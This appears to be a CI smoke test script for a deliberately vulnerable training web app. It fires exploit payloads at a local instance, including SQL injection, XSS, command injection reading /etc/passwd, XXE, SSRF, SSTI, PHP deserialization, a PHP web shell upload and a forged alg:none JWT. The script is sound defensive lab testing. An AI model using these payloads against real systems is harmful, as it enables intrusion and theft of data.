#!/usr/bin/env bash
# tests/smoke_test.sh — VulnWeb duman testi.
# Her zafiyetin LOW seviyesinde tetiklendiğini ("çözüldü") ve IMPOSSIBLE seviyesinde
# tetiklenmediğini doğrular. CI'da çalıştırılır; herhangi bir hata -> exit 1.
#
# Kullanım:  BASE=http://127.0.0.1:8088 ./tests/smoke_test.sh
set -u

BASE="${BASE:-http://127.0.0.1:8088}"
J="$(mktemp)"
PASS=0; FAIL=0
enc(){ python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1]))" "$1"; }
setlvl(){ curl -s -b "$J" -c "$J" -d "security=$1" "$BASE/security.php" -o /dev/null; }

login(){
  curl -s -c "$J" -b "$J" -d "username=admin&password=password" "$BASE/login.php" -o /dev/null
  curl -s -b "$J" "$BASE/index.php" | grep -q "Sign out" || { echo "FATAL: login başarısız"; exit 2; }
}

# assert_contains <haystack> <needle> <label>
ac(){ if echo "$1" | grep -q "$2"; then echo "  ✅ $3"; PASS=$((PASS+1)); else echo "  ❌ $3"; FAIL=$((FAIL+1)); fi; }
# assert_absent <haystack> <needle> <label>
aa(){ if echo "$1" | grep -q "$2"; then echo "  ❌ $3"; FAIL=$((FAIL+1)); else echo "  ✅ $3"; PASS=$((PASS+1)); fi; }

# exploit_low_impossible <id> <curl-args...>  : aynı isteği low (çözüldü olmalı) ve impossible (olmamalı) seviyelerinde çalıştırır
# Kullanım kolaylığı için her modül kendi bloğunu yazar.

echo "=== VulnWeb smoke test ($BASE) ==="
login

run(){ # run <method:GET|POST> <path> <data-or-query>
  local m="$1" p="$2" d="$3"
  if [ "$m" = "GET" ]; then curl -s -b "$J" "$BASE/$p?$d"; else curl -s -b "$J" -d "$d" "$BASE/$p"; fi
}

# Her modül: setlvl low -> exploit -> "çözüldü" bekle; setlvl impossible -> aynı -> "çözüldü" OLMASIN
check(){ # check <id> <method> <path> <data>
  local id="$1" m="$2" p="$3" d="$4"
  setlvl low;        ac "$(run "$m" "$p" "$d")" "çözüldü" "$id (low exploit)"
  setlvl impossible; aa "$(run "$m" "$p" "$d")" "çözüldü" "$id (impossible güvenli)"
}

check sqli              GET  "vulnerabilities/sqli/index.php"              "id=$(enc "1' UNION SELECT username,password_md5 FROM users-- -")"
check xss_reflected     GET  "vulnerabilities/xss_reflected/index.php"    "name=$(enc '<script>alert(1)</script>')"
check command_injection POST "vulnerabilities/command_injection/index.php" "ip=127.0.0.1; cat /etc/passwd"
check lfi               GET  "vulnerabilities/lfi/index.php"              "page=/etc/passwd"
check idor              GET  "vulnerabilities/idor/index.php"             "id=2"
check csrf              GET  "vulnerabilities/csrf/index.php"             "name=HACKED"
check open_redirect     GET  "vulnerabilities/open_redirect/index.php"    "next=$(enc 'https://evil.example.com')"
check weak_crypto       POST "vulnerabilities/weak_crypto/index.php"      "token=$(printf root | base64)"
check auth_brute        POST "vulnerabilities/auth_brute/index.php"       "u=gordonb&p=abc123"
check misconfig         GET  "vulnerabilities/misconfig/index.php"        "debug=1"
check business_logic    POST "vulnerabilities/business_logic/index.php"   "qty=-100"
check fail_open         GET  "vulnerabilities/fail_open/index.php"        "perm=GARBAGE"
check logging           GET  "vulnerabilities/logging/index.php"          "user=$(enc 'eve
00:00:00 SUCCESS login user=admin')"
check supply_chain      POST "vulnerabilities/supply_chain/index.php"     "msg=$(enc "__qlog_exec__:system('id');")"

# XXE (POST gövdesi özel)
setlvl low
ac "$(curl -s -b "$J" --data-urlencode 'xml=<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><r>&xxe;</r>' "$BASE/vulnerabilities/xxe/index.php")" "çözüldü" "xxe (low exploit)"
setlvl impossible
aa "$(curl -s -b "$J" --data-urlencode 'xml=<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><r>&xxe;</r>' "$BASE/vulnerabilities/xxe/index.php")" "çözüldü" "xxe (impossible güvenli)"

# SSRF
setlvl low
ac "$(curl -s -b "$J" --data-urlencode 'url=file:///etc/passwd' "$BASE/vulnerabilities/ssrf/index.php")" "çözüldü" "ssrf (low exploit)"
setlvl impossible
aa "$(curl -s -b "$J" --data-urlencode 'url=file:///etc/passwd' "$BASE/vulnerabilities/ssrf/index.php")" "çözüldü" "ssrf (impossible güvenli)"

# Deserialization
setlvl low
ac "$(curl -s -b "$J" --data-urlencode 'data=O:3:"Pwn":2:{s:3:"cmd";s:2:"id";s:6:"result";s:0:"";}' "$BASE/vulnerabilities/deserialization/index.php")" "çözüldü" "deserialization (low exploit)"
setlvl impossible
aa "$(curl -s -b "$J" --data-urlencode 'data=O:3:"Pwn":2:{s:3:"cmd";s:2:"id";s:6:"result";s:0:"";}' "$BASE/vulnerabilities/deserialization/index.php")" "çözüldü" "deserialization (impossible güvenli)"

# SSTI
setlvl low
ac "$(curl -s -b "$J" --data-urlencode "tpl={{shell_exec('id')}}" "$BASE/vulnerabilities/ssti/index.php")" "çözüldü" "ssti (low exploit)"
setlvl impossible
aa "$(curl -s -b "$J" --data-urlencode "tpl={{shell_exec('id')}}" "$BASE/vulnerabilities/ssti/index.php")" "çözüldü" "ssti (impossible güvenli)"

# XSS stored
setlvl low
ac "$(curl -s -b "$J" --data-urlencode 'name=h' --data-urlencode 'comment=<script>alert(1)</script>' "$BASE/vulnerabilities/xss_stored/index.php")" "çözüldü" "xss_stored (low exploit)"

# File upload (multipart)
SH="${TMPDIR:-/tmp}/vw_smoke_shell.php"; printf '<?php system($_GET["c"]); ?>' > "$SH"
setlvl low
ac "$(curl -s -b "$J" -F "uploaded=@$SH;type=image/jpeg" "$BASE/vulnerabilities/file_upload/index.php")" "çözüldü" "file_upload (low exploit)"
rm -f "$SH"

# Session fixation (GET ?sid + POST login)
setlvl low
ac "$(curl -s -b "$J" "$BASE/vulnerabilities/session_fixation/index.php?sid=ATTACKER_FIXED_42" -d 'action=login')" "çözüldü" "session_fixation (low exploit)"

# JWT (forged alg:none)
JWT="$(python3 -c "import base64,json;b=lambda d:base64.urlsafe_b64encode(d).rstrip(b'=').decode();print(b(json.dumps({'typ':'JWT','alg':'none'}).encode())+'.'+b(json.dumps({'role':'root'}).encode())+'.')")"
setlvl low
ac "$(curl -s -b "$J" --data-urlencode "jwt=$JWT" "$BASE/vulnerabilities/jwt/index.php")" "çözüldü" "jwt (low exploit)"
setlvl impossible
aa "$(curl -s -b "$J" --data-urlencode "jwt=$JWT" "$BASE/vulnerabilities/jwt/index.php")" "çözüldü" "jwt (impossible güvenli)"

# API mass assignment (JSON endpoint).
# NOT: api_profile session'da kalıcı (mass-assignment durumu). Her seviye TAZE session ile
# test edilir ki low'daki yükseltme impossible kontrolüne sızmasın.
J2="$(mktemp)"
curl -s -c "$J2" -b "$J2" -d "username=admin&password=password" "$BASE/login.php" -o /dev/null
curl -s -b "$J2" -c "$J2" -d "security=low" "$BASE/security.php" -o /dev/null
ac "$(curl -s -b "$J2" -d 'role=admin' "$BASE/vulnerabilities/api/index.php?api=profile")" '"_solved": true' "api (low mass-assign)"
rm -f "$J2"; J2="$(mktemp)"
curl -s -c "$J2" -b "$J2" -d "username=admin&password=password" "$BASE/login.php" -o /dev/null
curl -s -b "$J2" -c "$J2" -d "security=impossible" "$BASE/security.php" -o /dev/null
aa "$(curl -s -b "$J2" -d 'role=admin' "$BASE/vulnerabilities/api/index.php?api=profile")" '"_solved": true' "api (impossible güvenli)"
rm -f "$J2"

rm -f "$J"
echo "=== Sonuç: $PASS geçti, $FAIL başarısız ==="
[ "$FAIL" -eq 0 ] || exit 1
